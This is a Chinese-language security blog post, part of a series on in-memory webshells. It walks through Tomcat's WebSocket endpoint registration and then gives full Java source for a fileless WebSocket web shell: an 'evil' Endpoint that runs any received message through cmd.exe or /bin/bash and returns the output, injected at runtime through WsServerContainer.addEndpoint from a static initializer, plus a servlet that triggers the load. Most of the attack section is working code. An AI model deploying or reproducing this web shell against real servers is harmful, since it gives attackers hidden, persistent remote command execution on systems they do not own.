## 写在前面

通过前面对tomcat中的websocket的支持的解读，我们对websocket这个全双工协议有了更深的理解，接下来我们需要学习建立在其上的一种内存马,
tomcat-websocket内存马的实现。

这也是内存马系列文章的第八篇了。

## 前置

### 什么是tomcat Websocket？

相信只要跟过上一篇的源码，对这个流程并不陌生，这里也简单总结一下，

WebSocket是一种全双工通信协议，即客户端可以向服务端发送请求，服务端也可以主动向客户端推送数据。

建立通信的两端主要是`Endpoint`对象，

一个为`ServerEndpoint`一个为`ClientEndpoint`， 他们分别为服务端和客户端，

当客户端发起一个通信请求的时候，另一端在建立连接之后相应创建了一个`ServerEndpoint`对象，

因为都是`Endpoint`对象，我们可以看看Endpoint类，

![image-20220927172338131.png](https://image.3001.net/images/20221001/1664628325_6338366540c134a34254e.png!small)

这是一个抽象类，存在三个方法`onOpen / onClose / onError`，分别是在通信建立 / 通信关闭 / 发生错误的是调用调用不同的逻辑。

### Tomcat socket的简单案例

Tomcat中存在有两种方法进行实现：

  1. 使用`@ServerEndpoint`注解的方式；

  2. 继承抽象类`Endpoint`的方式。

我们使用注解的方式进行搭建。

官方文档  
https://docs.oracle.com/javaee/7/api/javax/websocket/server/ServerEndpoint.html

    
    
    package pres.test.momenshell;
    
    import javax.websocket.*;
    import javax.websocket.server.ServerEndpoint;
    
    @ServerEndpoint("/websocket")
    public class WebsocketTest {
        private Session session;
    
        @OnOpen
        public void onOpen(Session session) {
            this.session = session;
            this.session.getAsyncRemote().sendText("onOpen......");
        }
    
        @OnMessage
        public void onMessage(String message) {
            this.session.getAsyncRemote().sendText("onMessage...." + message);
        }
    
        @OnClose
        public void onClose() {
            System.out.println("onClose.....");
        }
    
        @OnError
        public void onError(Throwable throwable) {
            throwable.printStackTrace();
        }
    }
    

![image-20220927174454903.png](https://image.3001.net/images/20221001/1664628340_633836741e74914419c78.png!small)

在websocket连接成功之后，成功发送了`onOpen....`并且，在客户端可以成功发送消息。

![image-20220927180207656.png](https://image.3001.net/images/20221001/1664628349_6338367d309d40949b8eb.png!small)

如上图，在断开本次链接之后将会在服务段打印`onClose...`标识，

同样也可以通过继承`Endpoint`的方式实现。

需要实现多个类：

  1. Endpoint实现类：主要实现3个标准生命周期方法（onOpen、onError、onClose），添加MessageHandler对象；

  2. MessageHandler实现类：实现onMessage方法；

  3. ServerApplicationConfig实现类：完成Endpoint的URI路径注册。

    
    
    package pres.test.momenshell;
    
    import javax.websocket.Endpoint;
    import javax.websocket.EndpointConfig;
    import javax.websocket.MessageHandler;
    import javax.websocket.Session;
    import java.io.IOException;
    
    public class WebsocketTestPlus extends Endpoint {
        private Session session;
    
        @Override
        public void onOpen(Session session, EndpointConfig endpointConfig) {
            this.session = session;
            session.addMessageHandler(new MessageHandler.Whole<String>() {    //匿名类实现MessageHandler
                @Override
                public void onMessage(String message) {
                    System.out.println("onMessage: "+message);
                }
            });
            System.out.println("已连接WebsocketServer: " + session.toString());
            try {
                session.getBasicRemote().sendText("a");
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }
    
    
    
    package pres.test.momenshell;
    
    import javax.websocket.Endpoint;
    import javax.websocket.server.ServerApplicationConfig;
    import javax.websocket.server.ServerEndpointConfig;
    import java.util.HashSet;
    import java.util.Set;
    
    public class EndpointApplicationConfig implements ServerApplicationConfig {
        @Override
        public Set<ServerEndpointConfig> getEndpointConfigs(Set<Class<? extends Endpoint>> set) {
    
    
            Set<ServerEndpointConfig> result = new HashSet<>();
            if (set.contains(WebsocketTestPlus.class)) {
                result.add(ServerEndpointConfig.Builder.create(WebsocketTestPlus.class, "/websocket2").build());
            }
            return result;
        }
    
        @Override
        public Set<Class<?>> getAnnotatedEndpointClasses(Set<Class<?>> set) {
            System.out.println(set);
            return set;
        }
    }
    

同样在建立连接和发送消息的过程中有回显。

![image-20220927185913979.png](https://image.3001.net/images/20221001/1664628360_633836884e394902a2e37.png!small)

### 流程分析

接下来我们简单分析一下过程，

在Tomcat启动的时候，将会对classpath下的jar进行扫描，扫描包中的META-INF/services/javax.servlet.ServletContainerInitializer文件。

对于websocket来说，其内容为`org.apache.tomcat.websocket.server.WsSci`

![image-20220927191909271.png](https://image.3001.net/images/20221001/1664628379_6338369b23164c9106b4a.png!small)

所以将会加载该类，

![image-20220927192025378.png](https://image.3001.net/images/20221001/1664628385_633836a1dabb79d1affa0.png!small)

该类是`ServletContainerInitializer`的实现类，

首先调用`init`进行初始化操作WsServerContainer对象，

![image-20220927192809009.png](https://image.3001.net/images/20221001/1664628393_633836a9ca32756928dcc.png!small)

创建了两个监听器，

其余多的上一篇中已经详细的解读了一遍代码，这里就简单说说就行了。

![image-20220927193733442.png](https://image.3001.net/images/20221001/1664628404_633836b40a7edec88f311.png!small)

最后将会将调用addEndpoint方法将通过ServerApplicationConfig对象获取的ServerEndpointConfig对象的集合添加到`WsServerContainer`中去。

![image-20220927194012203.png](https://image.3001.net/images/20221001/1664628411_633836bbbb3f33690e2bb.png!small)

在取出了其中配置的路由之后生成了一个mapping映射。![image-20220927194223284.png](https://image.3001.net/images/20221001/1664628418_633836c22967506a27921.png!small)

在这里完成了路由的注册，

值得我们注意的是在创建`WsServerContainer`对象的时候，在其构造方法中添加过滤器。

![image-20220927194931319.png](https://image.3001.net/images/20221001/1664628426_633836ca2db04b2035898.png!small)

在所有放回所有资源的同时会被其拦截，判断是否注册有该路由的Endpoint。

![image-20220927195335162.png](https://image.3001.net/images/20221001/1664628433_633836d1292b4a40bcafd.png!small)

通过调用`findMapping`方法获取对应的Endpoint，如果为空，就通过`chain.doFilter`将请求放回，如果存在这个Endpoint，就会进行协议升级。

## 正文

### 注入方式

从上面的简单流程分析中，我们知道，想要注册一个Endpoint需要通过调用`WsServerContainer#addEndpoint`方法进行添加，自然首要的目的是需要动态获取到`WsServerContainer`对象。

我们可以注意到，在前面调用init方法是的时候设置了一个属性，

![image-20220927195826805.png](https://image.3001.net/images/20221001/1664628439_633836d7e31ec3fa2ed68.png!small)

属性值就是为我们创建的`WsServerContainer`对象，所以我们只需要在线程中获取到`servletContext`这个上下文，就能够通过它的属性`javax.websocket.server.ServerContainer`来获取对应的`WsServerContainer`对象，进而能够添加恶意的Endpoint。

那么如果构造一个恶意的Endpoint呢?

我们只需要创建一个继承`Endpoint`的子类，并且需要实现`MessageHandler`接口，重写其中的`onMessage``onOpen`等方法。

所以其注入流程就是：

  1. 实现Endpoint，MessageHandler.onMessage中实现命令执行的功能；

  2. 为Endpoint创建ServerEndpointConfig；

  3. 依次获取ServletConext和WsServerContainer；

  4. 通过WsServerContainer.addEndpoint添加ServerEndpointConfig。

### 实现内存马

我们首先编写恶意的Endpoint类

    
    
    package pres.test.momenshell;
    
    import org.apache.catalina.core.StandardContext;
    import org.apache.catalina.loader.WebappClassLoaderBase;
    import org.apache.tomcat.websocket.server.WsServerContainer;
    
    import javax.websocket.*;
    import javax.websocket.server.ServerContainer;
    import javax.websocket.server.ServerEndpointConfig;
    import java.io.InputStream;
    
    public class evil extends Endpoint implements MessageHandler.Whole<String> {
        private Session session;
    
        public void onMessage(String message) {
            try {
                boolean iswin = System.getProperty("os.name").toLowerCase().startsWith("windows");
                Process exec;
                if (iswin) {
                    exec = Runtime.getRuntime().exec(new String[]{"cmd.exe", "/c", message});
                } else {
                    exec = Runtime.getRuntime().exec(new String[]{"/bin/bash", "-c", message});
                }
    
                InputStream ips = exec.getInputStream();
                StringBuilder sb = new StringBuilder();
    
                int i;
                while((i = ips.read()) != -1) {
                    sb.append((char)i);
                }
    
                ips.close();
                exec.waitFor();
                this.session.getBasicRemote().sendText(sb.toString());
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    
        @Override
        public void onOpen(Session session, EndpointConfig config) {
            this.session = session;
            this.session.addMessageHandler(this);
        }
    }
    

其中在`onOpen`方法中加入了`MessageHandler`对象，并且在其`onMessage`中实现了我们想要的命令执行的功能。

之后我们创建一个`ServerEndpointConfig`对象添加路由

    
    
    ServerEndpointConfig build = ServerEndpointConfig.Builder.create(evil.class, "/evil").build();
    

再然后获取存放`WsServerContainer`对象的那个属性

    
    
    WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
    StandardContext standardContext = (StandardContext) webappClassLoaderBase.getResources().getContext();
    WsServerContainer attribute = (WsServerContainer) standardContext.getServletContext().getAttribute(ServerContainer.class.getName());
    

最后将恶意的Endpoint添加进入其中

    
    
    attribute.addEndpoint(build);
    

### 实操

首先创建一个Servlet

    
    
    package pres.test.momenshell;
    
    import org.apache.catalina.core.StandardContext;
    import org.apache.catalina.loader.WebappClassLoaderBase;
    import org.apache.tomcat.websocket.server.WsServerContainer;
    
    import javax.servlet.ServletException;
    import javax.servlet.http.HttpServlet;
    import javax.servlet.http.HttpServletRequest;
    import javax.servlet.http.HttpServletResponse;
    import javax.websocket.*;
    import javax.websocket.server.ServerContainer;
    import javax.websocket.server.ServerEndpointConfig;
    import java.io.IOException;
    import java.io.InputStream;
    
    public class AddWebSocket extends HttpServlet {
        @Override
        protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
            this.doPost(req, resp);
        }
    
        @Override
        protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
            try {
                Class.forName("pres.test.momenshell.evil");
            } catch (ClassNotFoundException e) {
                e.printStackTrace();
            }
        }
    }
    

配置好对应的mapping映射

编写好evil类

    
    
    package pres.test.momenshell;
    
    import org.apache.catalina.core.StandardContext;
    import org.apache.catalina.loader.WebappClassLoaderBase;
    import org.apache.tomcat.websocket.server.WsServerContainer;
    
    import javax.websocket.*;
    import javax.websocket.server.ServerContainer;
    import javax.websocket.server.ServerEndpointConfig;
    import java.io.InputStream;
    
    public class evil extends Endpoint implements MessageHandler.Whole<String> {
        static {
            WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
            StandardContext standardContext = (StandardContext) webappClassLoaderBase.getResources().getContext();
            ServerEndpointConfig build = ServerEndpointConfig.Builder.create(evil.class, "/evil").build();
            WsServerContainer attribute = (WsServerContainer) standardContext.getServletContext().getAttribute(ServerContainer.class.getName());
            try {
                attribute.addEndpoint(build);
            } catch (DeploymentException e) {
                throw new RuntimeException(e);
            }
        }
    
        private Session session;
    
        public void onMessage(String message) {
            try {
                boolean iswin = System.getProperty("os.name").toLowerCase().startsWith("windows");
                Process exec;
                if (iswin) {
                    exec = Runtime.getRuntime().exec(new String[]{"cmd.exe", "/c", message});
                } else {
                    exec = Runtime.getRuntime().exec(new String[]{"/bin/bash", "-c", message});
                }
    
                InputStream ips = exec.getInputStream();
                StringBuilder sb = new StringBuilder();
    
                int i;
                while((i = ips.read()) != -1) {
                    sb.append((char)i);
                }
    
                ips.close();
                exec.waitFor();
                this.session.getBasicRemote().sendText(sb.toString());
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    
        @Override
        public void onOpen(Session session, EndpointConfig config) {
            this.session = session;
            this.session.addMessageHandler(this);
        }
    }
    

上面的servlet主要是模拟反序列化等操作写入Websocket内存马

![image-20220927224613971.png](https://image.3001.net/images/20221001/1664628468_633836f4c37fbfb91b9f4.png!small)

能够成功执行`ipconfig`命令

## 总结

创建该内存马的流程：

  1. 获取当前的StandardContext；

  2. 通过StandardContext获取ServerContainer；

  3. 撰写一个恶意Endpoint类，并且实现了`MessageHandler`接口；

  4. 创建ServerEndpointConfig，给出对应的路由映射；

  5. 调用ServerContainer.addEndpoint方法，添加恶意类。

## Ref

https://xz.aliyun.com/t/11566

